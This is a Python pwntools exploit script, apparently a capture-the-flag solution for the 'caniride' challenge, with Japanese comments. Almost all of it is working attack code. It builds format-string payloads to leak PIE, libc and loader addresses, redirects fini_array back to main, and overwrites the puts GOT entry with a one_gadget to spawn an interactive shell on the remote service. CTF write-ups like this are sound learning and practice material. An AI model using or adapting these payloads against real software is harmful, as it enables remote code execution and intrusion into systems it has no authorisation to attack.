from pwn import *

elf = ELF("./caniride")
libc = ELF("./libc.so.6")

context.log_level = 'info'
context.terminal = "tmux splitw -h".split(" ")
#sock = process(elf.path)
sock = remote("challs.actf.co",31228)
gs = """
#break main
break *main+533
continue
"""
#sock = gdb.debug(elf.path,gdbscript=gs)

def convert_addr_to_fsbpayloads(addr):
    str_addr = hex(addr)[2:]
    assert len(str_addr) <= 6
    str_addr = str_addr.rjust(6,"0")
    l = [(addr>>(8*i)) & 0xff  for i in range(3)]
    l2 = sorted(l)
    ret = f"%{l2[0]}c%{16+l.index(l2[0])}$hhn%{l2[1]-l2[0]}c%{16+l.index(l2[1])}$hhn%{l2[2]-l2[1]}c%{16+l.index(l2[2])}$hhn"
    return ret

def convert_addr_to_fsbpayloads2(addr):
    str_addr = hex(addr)[2:]
    assert 9 < len(str_addr) and len(str_addr) <= 12
    str_addr = str_addr.rjust(12,"0")
    l = [(addr>>(16*i)) & 0xffff  for i in range(3)]
    l2 = sorted(l)
    ret = f"%{l2[0]}c%{16+l.index(l2[0])}$hn%{l2[1]-l2[0]}c%{16+l.index(l2[1])}$hn%{l2[2]-l2[1]}c%{16+l.index(l2[2])}$hn"
    return ret

#sock.sendlineafter(b"Name: ", convert_addr_to_fsbpayloads(0xe3b2e).encode())
sock.sendlineafter(b"Name: ", b"%105c%16$hhnZZZZ%17$sYYYY%34$llx")
#sock.sendlineafter(b"Name: ", b"%105c%16$hhnZZZZ%17$sYYYY")
#sock.sendlineafter(b"Name: ", b"%21097c%16$hn%748c%17$hn%18$hnZZZZ%19$s")

# pie base addressをリーク
sock.sendlineafter(b"Pick your driver: ", b"-3")

sock.recvuntil(b"Hi, this is ")
raw_data = sock.recvuntil(b" your")[:-5]
leak_addr = u64(raw_data.ljust(8,b"\x00"))
addr_base  =  leak_addr - 0x35a8

log.info("addr_base = " + hex(addr_base))

# addr_base + 0x3300 の__do_global_dtors_aux_fini_array_entry に mainを代入
payloads = p64(addr_base + 0x3300)
payloads += p64(addr_base + elf.got["puts"])
sock.sendlineafter(b"So... tell me a little about yourself: ", payloads)

sock.recvuntil(b"ZZZZ")
#addr_puts = u64((sock.recvline()[:-2]).ljust(8,b"\x00"))
addr_puts = u64( sock.recvuntil(b"YYYY")[:-4].ljust(8, b"\x00") )
log.info("addr_puts = " + hex(addr_puts))
addr_libc_base = addr_puts - libc.sym["puts"]
log.info("addr_libc_base = " + hex(addr_libc_base))

addr_rtld_global_2440 = int(b"0x" + sock.recvline()[:-2],16)
log.info("addr_rtld_global_2440 = " + hex(addr_rtld_global_2440))
addr_ld_base = addr_rtld_global_2440 - 0x2e9e8
log.info("addr_ld_base = " + hex(addr_ld_base))

# got["exit"] = one_gadget
addr_onegadgets = [0xe3b2e, 0xe3b31, 0xe3b34]
addr_onegadget = addr_libc_base + addr_onegadgets[0]
#sock.sendlineafter(b"Name: ", b"%19$n%20$n"+ convert_addr_to_fsbpayloads2(addr_onegadget).encode() + b"XXXX" )
sock.sendafter(b"Name: ", b"%20$n%19$n"+ convert_addr_to_fsbpayloads2(addr_onegadget).encode() + b"YY" )
sock.sendlineafter(b"Pick your driver: ", b"1")

payloads = p64( addr_base + elf.got["puts"] )
payloads += p64( addr_base + elf.got["puts"]+2 )
payloads += p64( addr_base + elf.got["puts"]+4 )
payloads += p64( addr_ld_base + 0x2f190)
payloads += p64( addr_ld_base + 0x2f190 + 4)
sock.sendlineafter(b"So... tell me a little about yourself: ", payloads)

sock.recvuntil(b"YY")

sock.interactive()
